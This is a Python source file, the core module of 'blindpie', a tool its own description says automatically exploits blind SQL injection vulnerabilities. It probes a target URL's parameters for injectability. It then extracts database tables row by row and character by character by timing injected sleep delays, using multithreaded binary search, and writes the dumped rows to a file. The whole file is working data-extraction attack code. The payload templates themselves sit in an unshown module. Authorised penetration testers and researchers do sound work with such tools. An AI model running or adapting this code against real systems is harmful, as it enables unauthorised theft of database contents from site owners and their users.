import logging
from abc import ABC, abstractmethod
from typing import List, Tuple, Dict, Optional
from copy import copy, deepcopy
from concurrent.futures import ThreadPoolExecutor
from time import time
from signal import signal, SIGINT
from sys import exit
from os.path import isfile
from blindpie.outputformatter import OutputFormatter, TsvOutputFormatter
from blindpie.target import ITarget, Target
from blindpie.request import IRequest
from blindpie.logger import ILogger
from blindpie.frame import SimpleFrame, ProgressFrame, TableFrame, IndeterminateProgressFrame, SpinnerFrame
from blindpie.payloadbuilder import IPayloadBuilder, PayloadBuilder, UnexploitableParameterException
from blindpie.defaults import *


__version__ = "0.2"

LOGGER = logging.getLogger(__name__)

BANNER = \
    """
     _     _ _           _       _      
    | |__ | (_)_ __   __| |_ __ (_) ___ 
    | '_ \| | | '_ \ / _` | '_ \| |/ _ \\
    | |_) | | | | | | (_| | |_) | |  __/
    |_.__/|_|_|_| |_|\__,_| .__/|_|\___| v{version}
                          |_|           
    """.format(version=__version__)

DESCRIPTION = "Automatically exploit blind-SQLi vulnerabilities."


class IBlindpie(ABC):
    """An interface representing the main application.
    """

    @abstractmethod
    def test(self, default_request: IRequest, params: List[str] = None, threshold: float = DEFAULT_THRESHOLD,
             max_interval: int = DEFAULT_MAX_INTERVAL, max_threads: int = DEFAULT_MAX_THREADS) -> List[str]:
        """Tests whether some parameters can be exploited.

        If the parameters are not provided all parameters are tested.

        :param default_request: IRequest -- a request containing the default
            values for the parameters
        :param params: List[str] -- the names of the parameters to test
        :param threshold: float -- a threshold used to decide if an answer is
            affirmative or negative based on a reference response time (must be
            greater than 1)
        :param max_interval: int -- the max time to wait between each request in
            ms
        :param max_threads: int -- the max number of threads to use concurrently
        :return: List[str] -- the names of the parameters which can be exploited
        """

        pass

    @abstractmethod
    def fetch_table(self, default_request: IRequest, param: str, table: str, columns: List[str], from_row: int = 0, n_rows: int = None,
                    min_row_length: int = DEFAULT_MIN_ROW_LENGTH, max_row_length: int = DEFAULT_MAX_ROW_LENGTH, threshold: float = DEFAULT_THRESHOLD,
                    max_interval: int = DEFAULT_MAX_INTERVAL, max_threads: int = DEFAULT_MAX_THREADS, output_path: str = "./blindpie.out",
                    output_formatter: OutputFormatter = None) -> None:
        """Tries to exploit a vulnerable parameter to fetch a table.

        :param default_request: IRequest -- a request containing the default
            values for the parameters
        :param param: str -- the name of the parameter to exploit
        :param table: str -- the name of the table to fetch
        :param columns: List[str] -- the names of the columns to select from the
            table
        :param from_row: int -- the row index from which to start selecting
        :param n_rows: int -- the number of rows to select
        :param min_row_length: int -- limits the selection to rows longer or
            equal to this
        :param max_row_length: int -- limits the selection to rows shorter or
            equal to this
        :param threshold: float -- a threshold used to decide if an answer is
            affirmative or negative based on a reference response time (must be
            greater than 1)
        :param max_interval: int -- the max time to wait between each request in
            ms
        :param max_threads: int -- the max number of threads to use concurrently
        :param output_path: str -- the path to the output file in which to
            print the results
        :param output_formatter: OutputFormatter -- the output formatter to use
            when logging and printing onto the file
        """

        pass


class Blindpie(IBlindpie):
    """The main application.
    """

    def __init__(self, url: str, params: Dict[str, str], logger: ILogger):
        """Instantiates the main application.

        :param url: str -- the URL of the target
        :param params: Dict[str, str] -- the names of the parameters of the
            requests, and their default values
        :param logger: ILogger -- the logger to use
        """

        self.__target: ITarget = Target(url)
        self.__params: Dict[str, str] = params
        self.__logger: ILogger = logger
        self.__payload_builder: IPayloadBuilder = PayloadBuilder(target=self.__target, threshold=DEFAULT_THRESHOLD)

        # Handle Ctrl-C:
        signal(SIGINT, self._default_signal_handler)

    def _default_signal_handler(self, _, __):
        """Default handler for the Ctrl+C keystroke event.

        Stops the logger and stops the main application.
        """

        self.__logger.end()
        exit()

    def _reduce_range(self, default_request: IRequest, param: str, min_value: int, max_value: int, sqli_payload: str,
                      max_interval: int = DEFAULT_MAX_INTERVAL, max_threads: int = DEFAULT_MAX_THREADS) -> Tuple[Optional[int], Optional[int]]:
        """Tries to reduce a range in which a value to find is in.

        The SQL injection payload must contain the following placeholders:

        - condition -- the condition to check
        - value -- the value to check

        If both the values are -1, the value to find isn't in any range.
        If both the values in the returned tuple are None, the range couldn't be
        reduced.
        If it's None only the first value the value to find is before the mid
        value.
        Similarly, if it's None only the second value, the value to find is
        after the mid value.
        If both the values are not None and are equal, the value is found and is
        that one.

        :param default_request: IRequest -- a request containing the default
            values for the parameters
        :param param: str -- the name of the vulnerable parameter to exploit
        :param min_value: int -- the min value of the range to reduce
        :param max_value: int -- the max value of the range to reduce
        :param sqli_payload: str -- the SQL injection payload used to exploit
            the parameter
        :param max_interval: int -- the max time to wait between each request in
            ms
        :param max_threads: int -- the max number of threads to use concurrently
        :return: Tuple[Optional[int], Optional[int]] -- the reduced range (min
            value, max value)
        """

        sleep_time_ms = self.__payload_builder.get_sleep_time(default_request=default_request)

        mid_value = min_value + (max_value - min_value) // 2
        mid_value = max_value if mid_value == min_value else mid_value
        LOGGER.debug("Reducing range: (min_value={min_value}, mid_value={mid_value}, max_value={max_value})".format(min_value=min_value, mid_value=mid_value, max_value=max_value))

        requests = list()
        sqli_params = copy(self.__params)
        sqli_params[param] = copy(sqli_payload).format(condition="=", value=mid_value)
        requests.append(deepcopy(default_request).set_params(sqli_params))

        sqli_params = copy(self.__params)
        sqli_params[param] = copy(sqli_payload).format(condition=">", value=mid_value)
        requests.append(deepcopy(default_request).set_params(sqli_params))

        sqli_params = copy(self.__params)
        sqli_params[param] = copy(sqli_payload).format(condition="<", value=mid_value)
        requests.append(deepcopy(default_request).set_params(sqli_params))

        LOGGER.debug("Prepared requests: [{:s}]".format('; '.join([str(r) for r in requests])))

        resp_times_ms = self.__target.get_response_times(requests_=requests, max_interval=max_interval,
                                                         max_threads=max_threads)
        LOGGER.debug("Response times for partition ({min_value}, {mid_value}, {max_value}): [{:s}]".format(', '.join([str(t) for t in resp_times_ms]), min_value=min_value, mid_value=mid_value, max_value=max_value))
        LOGGER.debug("Sleep time: {:f} ms".format(sleep_time_ms))

        if len([t for t in resp_times_ms if t >= sleep_time_ms]) > 1:
            # Two or more conditions are contradicting:
            return None, None
        elif len([t for t in resp_times_ms if t < sleep_time_ms]) == 3:
            # No condition is satisfied:
            return -1, -1

        if resp_times_ms.index(max(resp_times_ms)) == 0 and resp_times_ms[0] >= sleep_time_ms:
            return mid_value, mid_value
        elif resp_times_ms.index(max(resp_times_ms)) == 1 and resp_times_ms[1] >= sleep_time_ms:
            return mid_value, None
        elif resp_times_ms.index(max(resp_times_ms)) == 2 and resp_times_ms[2] >= sleep_time_ms:
            return None, mid_value

    def _get_value(self, default_request: IRequest, param: str, min_value: int, max_value: int, sqli_payload: str,
                   max_interval: int = DEFAULT_MAX_INTERVAL, max_threads: int = DEFAULT_MAX_THREADS) -> Optional[int]:
        """Tries to find a value given the interval in which is in.

        The SQL injection payload must contain the following placeholders:

        - condition -- the condition to check
        - value -- the value to check

        :param default_request: IRequest -- a request containing the default
            values for the parameters
        :param param: str -- the name of the vulnerable parameter to exploit
        :param min_value: int -- the min value of the range
        :param max_value: int -- the max value of the range
        :param sqli_payload: str -- the SQL injection payload used to exploit
            the parameter
        :param max_interval: int -- the max time to wait between each request in
            ms
        :param max_threads: int -- the max number of threads to use concurrently
        :return: Optional[int] -- the value if found, None otherwise
        """

        n_values = max_value - min_value + 1

        max_threads_ = 1 if max_threads < 4 else 3
        thread_pool_size = max_threads - max_threads_
        thread_pool_size = 1 if thread_pool_size < 1 else thread_pool_size

        LOGGER.debug("Thread pool size: {:d}".format(thread_pool_size))

        while n_values > 0:

            LOGGER.debug("Size of the current range: {:d}".format(n_values))
            LOGGER.debug("Current range: ({min_value}, {max_value})".format(min_value=min_value, max_value=max_value))

            partitions: List[Tuple[int, int]] = list()

            partition_size = n_values // thread_pool_size
            LOGGER.debug("Current partition size: {:d}".format(partition_size))
            for i in range(thread_pool_size):
                partition_min_value = min_value + partition_size * i
                partition_max_value = partition_min_value + partition_size - 1
                partition_max_value = 0 if partition_max_value < 0 else partition_max_value
                if n_values % thread_pool_size != 0 and i == thread_pool_size - 1:
                    partition_max_value += n_values - partition_size * thread_pool_size
                partitions.append((partition_min_value, partition_max_value))

            LOGGER.debug("Current partitions: [{:s}]".format(', '.join([str(p) for p in partitions])))

            with ThreadPoolExecutor(max_workers=thread_pool_size) as thread_pool:
                threads = [thread_pool.submit(self._reduce_range, default_request=default_request, param=param, min_value=p[0], max_value=p[1], sqli_payload=sqli_payload, max_interval=max_interval, max_threads=max_threads_)
                           for p in partitions]
                reduced_ranges = [t.result() for t in threads]
                LOGGER.debug("Reduced ranges: [{:s}]".format('; '.join(["partition={:s}, reduced={:s}".format(str(p), str(reduced_ranges[i])) for i, p in enumerate(partitions)])))

            for range_ in reduced_ranges:
                if range_ == (-1, -1):
                    LOGGER.debug("Value could not be found in range ({min_value}, {max_value})".format(min_value=min_value, max_value=max_value))
                    return None
                if range_[0] is not None and range_[1] is not None and range_[0] == range_[1]:
                    LOGGER.debug("Found value '{:d}' in range ({min_value}, {max_value})".format(range_[0], min_value=min_value, max_value=max_value))
                    return range_[0]

            # Merge the reduced ranges:
            min_value = max([v[0] for v in reduced_ranges if v[0] is not None], default=min_value)
            max_value = min([v[1] for v in reduced_ranges if v[1] is not None], default=max_value)
            n_values = max_value - min_value + 1

        return None

    def fetch_char(self, default_request: IRequest, param: str, table: str, columns: List[str], row_index: int, char_index: int,
                   min_value: int = DEFAULT_MIN_CHAR, max_value: int = DEFAULT_MAX_CHAR, max_interval: int = DEFAULT_MAX_INTERVAL,
                   max_threads: int = DEFAULT_MAX_THREADS) -> Optional[str]:
        """Tries to fetch a character in a row.

        :param default_request: IRequest -- a request containing the default
            values for the parameters
        :param param: str -- the name of the vulnerable parameter to exploit
        :param table: str -- the name of the table to select from
        :param columns: List[str] -- the names of the columns to select from the
            table
        :param row_index: int -- the index of the row to select
        :param char_index: int -- the index of the char in the row
        :param min_value: int -- the min value of the range in which to search
            the character
        :param max_value: int -- the max value of the range in which to search
            the character
        :param max_interval: int -- the max time to wait between each request in
            ms
        :param max_threads: int -- the max number of threads to use concurrently
        :return: Optional[str] -- the character if found, None otherwise
        """

        # Check if parameter is exploitable:
        try:
            self.__payload_builder.get_test_payload(default_request=default_request, param=param, max_interval=max_interval, max_threads=max_threads)
        except UnexploitableParameterException as e:
            raise ValueError(str(e))

        sleep_time_ms = self.__payload_builder.get_sleep_time(default_request=default_request)
        sqli_payload = self.__payload_builder.get_fetch_char_payload(default_request=default_request, param=param)
        columns, _ = self.__payload_builder.get_columns_concat(columns)

        sqli_payload = sqli_payload.format(column_name=columns, table_name=table, row_index=row_index, char_index=char_index, condition="{condition}", value="{value}", sleep_time=sleep_time_ms / 1000)
        LOGGER.debug("SQLi payload: {:s}".format(sqli_payload))

        char = self._get_value(default_request=default_request, param=param, min_value=min_value, max_value=max_value, sqli_payload=sqli_payload, max_interval=max_interval, max_threads=max_threads)

        return chr(char) if char is not None else None

    def fetch_row_length(self, default_request: IRequest, param: str, table: str, columns: List[str], row_index: int,
                         min_row_length: int = DEFAULT_MIN_ROW_LENGTH, max_row_length: int = DEFAULT_MAX_ROW_LENGTH, max_interval: int = DEFAULT_MAX_INTERVAL,
                         max_threads: int = DEFAULT_MAX_THREADS) -> Optional[int]:
        """Tries to fetch the length of a row.

        :param default_request: IRequest -- a request containing the default
            values for the parameters
        :param param: str -- the name of the vulnerable parameter to exploit
        :param table: str -- the name of the table to select from
        :param columns: List[str] -- the names of the columns to select from the
            table
        :param row_index: int -- the index of the row to select
        :param min_row_length: int -- the min value of the range in which to
            search the length
        :param max_row_length: int -- the max value of the range in which to
            search the length
        :param max_interval: int -- the max time to wait between each request in
            ms
        :param max_threads: int -- the max number of threads to use concurrently
        :return: Optional[int] -- the length if found, None otherwise
        """

        # Check if parameter is exploitable:
        try:
            self.__payload_builder.get_test_payload(default_request=default_request, param=param, max_interval=max_interval, max_threads=max_threads)
        except UnexploitableParameterException as e:
            raise ValueError(str(e))

        sleep_time_ms = self.__payload_builder.get_sleep_time(default_request=default_request)
        sqli_payload = self.__payload_builder.get_fetch_row_length_payload(default_request=default_request, param=param)
        columns, _ = self.__payload_builder.get_columns_concat(columns)

        sqli_payload = sqli_payload.format(column_name=columns, table_name=table, row_index=row_index, condition="{condition}", value="{value}", sleep_time=sleep_time_ms / 1000)
        LOGGER.debug("SQLi payload: {:s}".format(sqli_payload))

        return self._get_value(default_request=default_request, param=param, min_value=min_row_length, max_value=max_row_length, sqli_payload=sqli_payload, max_interval=max_interval, max_threads=max_threads)

    def fetch_row(self, default_request: IRequest, param: str, table: str, columns: List[str], row_index: int, max_interval: int = DEFAULT_MAX_INTERVAL,
                  max_threads: int = DEFAULT_MAX_THREADS) -> Optional[Dict[str, str]]:
        """Tries to fetch a row.

        The row is a dictionary (column name, row value).

        :param default_request: IRequest -- a request containing the default
            values for the parameters
        :param param: str -- the name of the vulnerable parameter to exploit
        :param table: str -- the name of the table to select from
        :param columns: List[str] -- the names of the columns to select from the
            table
        :param row_index: int -- the index of the row to select
        :param max_interval: int -- the max time to wait between each request in
            ms
        :param max_threads: int -- the max number of threads to use concurrently
        :return: Optional[Dict[str, str]] -- the row if found, None otherwise
        """

        # Check if parameter is exploitable:
        try:
            self.__payload_builder.get_test_payload(default_request=default_request, param=param, max_interval=max_interval, max_threads=max_threads)
        except UnexploitableParameterException as e:
            raise ValueError(str(e))

        row_length = self.fetch_row_length(default_request=default_request, param=param, table=table, columns=columns, row_index=row_index, min_row_length=DEFAULT_MIN_ROW_LENGTH, max_row_length=DEFAULT_MAX_ROW_LENGTH, max_interval=max_interval, max_threads=max_threads)

        row_dict = {column: '' for column in columns}

        if row_length is None:
            return None
        elif row_length == 0:
            return row_dict

        LOGGER.info("Row {:d} has length {:d}".format(row_index, row_length))

        row_value = []
        for char_index in range(1, row_length + 1):
            char_value = self.fetch_char(default_request=default_request, param=param, table=table, columns=columns, row_index=row_index, char_index=char_index, min_value=DEFAULT_MIN_CHAR, max_value=DEFAULT_MAX_CHAR, max_interval=max_interval, max_threads=max_threads)
            char_value = DEFAULT_UNKNOWN_CHAR if char_value is None else char_value
            row_value.append(char_value)
            LOGGER.info("Found char {:s} (position={:d}/{:d}, row={:d})".format(char_value, char_index, row_length, row_index))
        row_value = ''.join(row_value)

        _, separator = self.__payload_builder.get_columns_concat(columns=columns)
        for column, value in zip(columns, row_value.split(separator)):
            row_dict[column] = value

        return row_dict

    def test(self, default_request: IRequest, params: List[str] = None, threshold: float = DEFAULT_THRESHOLD, max_interval: int = DEFAULT_MAX_INTERVAL,
             max_threads: int = DEFAULT_MAX_THREADS) -> List[str]:

        def signal_handler(signum, frame):

            self.__logger.log(SimpleFrame(index=4, content="Testing has been stopped."))
            LOGGER.info("Testing has been stopped")
            self._default_signal_handler(signum, frame)

        # Handle Ctrl-C:
        signal(SIGINT, signal_handler)

        if threshold <= 1:
            raise ValueError("The threshold must be greater than 1.")

        if params is None:
            params = self.__params.keys()
        if threshold != DEFAULT_THRESHOLD:
            self.__payload_builder.set_threshold(threshold=threshold)

        banner = SimpleFrame(index=0, content=BANNER)
        target_info = TableFrame(index=1, table=[["Target response time:", ''], ["Injected sleep time:", '']])
        progress_info = ProgressFrame(index=2, n_progress_bars=1)
        test_info = TableFrame(index=3, table=[[''] for _ in params])

        self.__logger.reset()
        self.__logger.log(banner)

        reference_resp_time_ms = self.__payload_builder.get_reference_resp_time(default_request)
        sleep_time_ms = self.__payload_builder.get_sleep_time(default_request)
        target_info.set_row(row_index=0, column_index=1, value="{:.2f} ms ({:.3f} sec)".format(reference_resp_time_ms, reference_resp_time_ms / 1000))
        target_info.set_row(row_index=1, column_index=1, value="{:.2f} ms ({:.3f} sec)".format(sleep_time_ms, sleep_time_ms / 1000))
        self.__logger.log(target_info)

        exploitable_params = list()
        for i, p in enumerate(params):
            progress_info.set_progress(progress_bar_index=0, progress=i, total=len(params) - 1, start_message="Testing parameter '{:s}':".format(p))
            self.__logger.log(progress_info)

            try:
                self.__payload_builder.get_test_payload(default_request=default_request, param=p, max_interval=max_interval, max_threads=max_threads)
                exploitable_params.append(p)
                test_info.set_row(row_index=i, column_index=0, value="'{:s}' seems to be exploitable".format(p))
            except UnexploitableParameterException:
                test_info.set_row(row_index=i, column_index=0, value="'{:s}' doesn't seem to be exploitable".format(p))

            self.__logger.log(test_info)

        progress_info.set_progress(progress_bar_index=0, progress=1, total=1, start_message="All parameter have been tested:")
        self.__logger.log(progress_info)
        self.__logger.end()

        return exploitable_params

    def fetch_table(self, default_request: IRequest, param: str, table: str, columns: List[str], from_row: int = 0, n_rows: int = None,
                    min_row_length: int = DEFAULT_MIN_ROW_LENGTH, max_row_length: int = DEFAULT_MAX_ROW_LENGTH, threshold: float = DEFAULT_THRESHOLD,
                    max_interval: int = DEFAULT_MAX_INTERVAL, max_threads: int = DEFAULT_MAX_THREADS, output_path: str = "./blindpie.out",
                    output_formatter: OutputFormatter = None) -> None:

        output_file_reference = None

        def signal_handler(signum, frame):

            self.__logger.log(SimpleFrame(index=5, content="Fetching has been stopped."))
            LOGGER.info("Fetching has been stopped")

            if output_file_reference is not None:
                output_file_reference.write(output_formatter.get_formatted_footer())
                output_file_reference.close()
                self.__logger.log(SimpleFrame(index=6, content="You can find the fetched results into '{:s}'.".format(output_path)))
                LOGGER.info("The output file has been closed")

            self._default_signal_handler(signum, frame)

        # Handle Ctrl-C:
        signal(SIGINT, signal_handler)

        if threshold <= 1:
            raise ValueError("The threshold must be greater than 1.")

        # If output file already exists:
        while isfile(output_path):
            output_path += "_2"
        if threshold != DEFAULT_THRESHOLD:
            self.__payload_builder.set_threshold(threshold=threshold)
        if output_formatter is None:
            output_formatter = TsvOutputFormatter(columns=columns)

        # Check if parameter is exploitable:
        try:
            self.__payload_builder.get_test_payload(default_request=default_request, param=param, max_interval=max_interval, max_threads=max_threads)
        except UnexploitableParameterException as e:
            raise ValueError(str(e))

        fetch_table_start_time = time()

        banner = SimpleFrame(index=0, content=BANNER)
        target_info = TableFrame(index=1, table=[["Target response time:", ''], ["Injected sleep time:", '']])
        progress_info = ProgressFrame(index=2, n_progress_bars=1) if n_rows is not None else IndeterminateProgressFrame(index=2, n_progress_bars=1)
        fetch_info = TableFrame(index=3, table=[["Last row:", ''], ["Fetched {:d}/{:d} rows."]])
        eta_info = SpinnerFrame(index=4, n_spinners=1)

        self.__logger.reset()
        self.__logger.log(banner)

        reference_resp_time_ms = self.__payload_builder.get_reference_resp_time(default_request)
        sleep_time_ms = self.__payload_builder.get_sleep_time(default_request)
        target_info.set_row(row_index=0, column_index=1, value="{:.2f} ms ({:.3f} sec)".format(reference_resp_time_ms, reference_resp_time_ms / 1000))
        target_info.set_row(row_index=1, column_index=1, value="{:.2f} ms ({:.3f} sec)".format(sleep_time_ms, sleep_time_ms / 1000))
        self.__logger.log(target_info)

        with open(output_path, "w+") as output_file:

            output_file.write(output_formatter.get_formatted_header() + '\n')
            output_file_reference = output_file

            current_row_index = from_row
            fetch_row_times_s = list()
            fetch_row_lengths = list()
            n_fetched_rows = 0

            eta_info.set_spinner(spinner_index=0, start_message="Computing estimated time...")
            self.__logger.log(eta_info)

            while True:

                if n_rows is not None and current_row_index == from_row + n_rows:
                    break

                progress = n_fetched_rows if n_rows is not None else 1
                total = n_rows if n_rows is not None else 4
                progress_info.set_progress(progress_bar_index=0, progress=progress, total=total, start_message="Fetching row {:d}:".format(current_row_index))
                self.__logger.log(progress_info)

                fetch_row_start_time = time()
                row_dict = self.fetch_row(default_request=default_request, param=param, table=table, columns=columns, row_index=current_row_index, max_interval=max_interval, max_threads=max_threads)

                if row_dict is None:
                    break

                fetch_row_end_time = time() - fetch_row_start_time
                fetch_row_times_s.append(fetch_row_end_time)
                row_value = ''.join([v for v in row_dict.values()])
                fetch_row_lengths.append(len(row_value))

                formatted_row = output_formatter.get_formatted_row(row_dict)
                output_file.write(formatted_row + '\n')

                n_fetched_rows += 1

                if row_value == '':
                    fetch_info.set_row(row_index=0, column_index=0, value="Last row was empty.")
                    fetch_info.set_row(row_index=0, column_index=1, value='')
                else:
                    fetch_info.set_row(row_index=0, column_index=0, value="Last row:")
                    fetch_info.set_row(row_index=0, column_index=1, value=formatted_row)
                fetch_info.set_row(row_index=1, column_index=0, value="Fetched {:d}/{:s} rows.".format(n_fetched_rows, str(n_rows) if n_rows is not None else '-'))

                weighted_average_row_fetch_time_s = sum(x * y for x, y in zip(fetch_row_times_s, fetch_row_lengths)) / sum(fetch_row_times_s)
                if n_rows is None:
                    eta_info.set_spinner(spinner_index=0, start_message="Estimated time: {:.2f} sec (for one row)".format(weighted_average_row_fetch_time_s))
                else:
                    n_remaining_rows = n_rows - n_fetched_rows
                    eta_info.set_spinner(spinner_index=0, start_message="Estimated time: {:.2f} min (to completion)".format(weighted_average_row_fetch_time_s * n_remaining_rows / 60))
                self.__logger.log(eta_info)
                self.__logger.log(fetch_info)

                current_row_index += 1

            output_file.write(output_formatter.get_formatted_footer())

        progress_info.set_progress(progress_bar_index=0, progress=1, total=1, start_message="All rows have been fetched:")
        self.__logger.log(progress_info)

        fetch_info.set_row(row_index=1, column_index=0, value="All rows have been dumped.")
        fetch_table_end_time = time() - fetch_table_start_time
        eta_info.set_spinner(spinner_index=0, start_message="All done in about {:.2f} min.".format(fetch_table_end_time / 60), end=True)
        self.__logger.log(eta_info)
        self.__logger.log(fetch_info)

        self.__logger.end()
